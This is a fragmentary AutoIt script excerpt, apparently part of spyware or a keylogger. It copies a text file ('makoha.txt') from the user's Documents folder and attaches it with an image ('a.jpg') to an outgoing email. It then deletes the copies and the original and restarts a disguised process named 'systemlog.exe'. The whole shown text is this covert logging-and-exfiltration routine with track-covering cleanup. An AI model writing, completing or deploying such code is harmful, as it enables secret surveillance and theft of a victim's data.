...
FileCopy(@MyDocumentsDir&"\makoha.txt",@ScriptDir&"\makoha.txt",1)
 ;#################################################
...
$AttachFiles = "a.jpg;makoha.txt"                      ; the file(s) you want to attach seperated with a ; (Semicolon) - leave blank if not needed
...
Func MyErrFunc()
    ...
    Return
 EndFunc   ;==>MyErrFunc
 FileDelete(@ScriptDir&"\makoha.txt")
 FileDelete(@ScriptDir&"\a.jpg")
 ProcessClose("systemlog.exe")
 sleep(1000)
 FileDelete(@MyDocumentsDir&"\makoha.txt")
 Run(@ScriptDir&"\systemlog.exe")
